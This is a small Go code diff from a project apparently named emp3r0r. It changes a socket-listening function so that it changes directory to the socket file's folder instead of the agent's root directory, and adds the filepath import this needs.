@@ -7,6 +7,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"path/filepath"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -30,7 +31,7 @@ func socketListen() {
 	if err != nil {
 		log.Fatalf("Failed to get current working directory: %v", err)
 	}
-	os.Chdir(agent.RuntimeConfig.AgentRoot)
+	os.Chdir(filepath.Dir(agent.RuntimeConfig.SocketName))
 	defer os.Chdir(cwd)
 	log.Printf("Cd to %s", agent.RuntimeConfig.AgentRoot)
 
